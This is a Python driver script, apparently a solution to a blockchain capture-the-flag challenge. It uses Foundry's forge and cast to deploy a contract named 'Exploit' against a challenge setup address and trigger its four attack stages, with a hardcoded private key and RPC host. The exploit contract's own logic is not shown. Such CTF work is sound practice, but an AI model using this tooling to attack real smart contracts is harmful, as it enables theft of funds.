import hashlib
import time
import json
import os
import subprocess
import time

from eth_account.typed_transactions.set_code_transaction import (
    Authorization,
)
from eth_account.datastructures import SignedSetCodeAuthorization
from eth_keys.datatypes import Signature
from pwn import remote
from hexbytes import HexBytes
from web3 import Web3

# CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
# CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "1337")
DEV = True

# r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
# r.recvuntil(b"action? ")
# r.sendline(b"1")

def script_call(funcitonName: str, rpc_url: str = "run()", pv_key: str = "", env: dict = {}):
    res = subprocess.run(
    [
        "forge",
        "script",
        "ExploitScript",
        "--sig",
        funcitonName,
        "--broadcast",
        "--private-key",
        pv_key,
        "--rpc-url",
        rpc_url,
        "-vvv",
        "--odyssey"
    ],
    env=env,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    )
    return (res.stdout.decode(), res.stderr.decode())

def cast_call(addr: str, sig: str) -> str:
    # use cast instead of web3py because it's easier
    env = os.environ.copy()
    env['SETUP'] = land_addr
    res = subprocess.run(
        [
            "cast",
            "call",
            addr,
            sig,
            "--rpc-url",
            rpc_url,
        ],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    return res.stdout.decode().strip()

def cast_send(addr: str, sig: str, pv_key: str, rpc_url: str, env: dict = {}):
    res = subprocess.run(
        [
            "cast",
            "send",
            addr,   
            sig,
            "--private-key",
            pv_key,
            "--rpc-url",
            rpc_url,
        ],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return (res.stdout.decode().strip(), res.stderr.decode().strip())

def create(addr: str, pv_key: str, rpc_url: str, env: dict = {}):
    print(f"Creating exploit contract with address {addr}")
    res = subprocess.run(
        [
            "forge",
            "create",
            "./src/Script.s.sol:Exploit",
            "--broadcast",
            "--private-key",
            pv_key,
            "--rpc-url",
            rpc_url,
            "--constructor-args",
            addr,
        ],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return (res.stdout.decode().strip(), res.stderr.decode().strip())

def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


if not DEV:
    solve_pow(r)

# r.recvuntil(b"uuid:")
# uuid = r.recvline().strip()

setup_addr = "0x33f2D286C37bA672562cA96A97e9047C93a10002"
pv_key = "0x9f177531d167891c3ade8a6b754393750350f941da78feaaeecf1d678dd14891"
rpc_url = "http://rpc.eng.run:8372"
env=os.environ.copy()
env.update({
    "SETUP": setup_addr
})

out, err = create(setup_addr, pv_key, rpc_url, env)
print(out)
print(err)
exploit_addr = out.split("Deployed to: ")[1].split("\n")[0]
print(f"Exploit contract deployed to {exploit_addr}")
time.sleep(60);
print("Stage 1")
out, err = cast_send(exploit_addr, "stage1()", pv_key, rpc_url, env)
print(out)
print(err)
time.sleep(5)
print("Stage 2")
out, err = cast_send(exploit_addr, "stage2()", pv_key, rpc_url, env)
print(out)
print(err)
time.sleep(60)
print("Stage 3")
out, err = cast_send(exploit_addr, "stage3()", pv_key, rpc_url, env)
print(out)
print(err)
time.sleep(5)
print("Stage 4")
out, err = cast_send(exploit_addr, "stage4()", pv_key, rpc_url, env)
print(out)
print(err)

# r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
# r.recv()
# r.sendline(b"3")
# r.recvuntil(b"uuid please: ")
# r.sendline(uuid)
# r.recvuntil(b"Here's the flag: \n")
# flag = r.recvline().strip()
# print(flag)




"""
r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"2")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
out = r.recvline().strip()
print(out)
"""
